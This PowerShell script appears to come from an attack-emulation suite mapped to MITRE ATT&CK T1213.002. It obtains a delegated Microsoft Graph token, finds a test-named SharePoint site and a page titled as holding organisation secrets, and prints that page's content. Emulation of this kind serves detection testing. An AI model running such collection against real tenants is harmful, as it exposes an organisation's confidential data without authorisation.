<#
.SYNOPSIS
Connect to the Graph API and fetch a SharePoint page

.DESCRIPTION
TA0009/10: Collection & Exfiltration
T1213.002:  Data from Information Repositories: Sharepoint 
1st attack method
#>

Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1

# We use the Graph environment variables
Import-Environment "graph.env"
$tenantName = $env:TENANT_ID.Split(".")[0]

Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1
$scope = "Sites.Read.All Files.ReadWrite.All"
if ($null -eq $accessToken) { $accessToken = Get-DelegatedAccessToken -tenantId $env:TENANT_ID -clientId $env:GRAPH_DELEGATE_CLIENT_ID -scope $scope -redirectUrl $env:GRAPH_DELEGATE_REDIRECT_URI }

$url = "https://graph.microsoft.com/v1.0/sites?search=ta0009 - t1213.002 - 1"
$response = Invoke-RestMethod $url -Method Get -Headers @{"Authorization"="Bearer $accessToken"}
foreach ($site in $response.value) {
    if ($site.name -like "ta0009-t1213.002-1-*") {
        if ($siteId -ne $null) {
            Write-Error "Multiple sites found"
            exit 1
        }
        Write-Host "Using $($site.name)"
        $siteId = $site.id
    }
}
if ($siteId -eq $null) {
    Write-Error "No site found"
    exit 1
}

$url = "https://graph.microsoft.com/v1.0/sites/$siteId/pages/microsoft.graph.sitePage"
$response = Invoke-RestMethod $url -Method Get -Headers @{"Authorization"="Bearer $accessToken"}
foreach ($page in $response.value) {
    if ($page.title -like "* - Page with org secrets") {
        Write-Host "Found page $($page.title)"
        $pageId = $page.id
    }
}
if ($pageId -eq $null) {
    Write-Error "No page found"
    exit 1
}

$url = "https://graph.microsoft.com/v1.0/sites/$siteId/pages/$pageId/microsoft.graph.sitePage?`$expand=canvasLayout"
$response = Invoke-RestMethod $url -Method Get -Headers @{"Authorization"="Bearer $accessToken"}
$secrets = $response.canvasLayout.horizontalSections.columns.webparts.innerHtml
Write-Host "Found secret: $secrets"
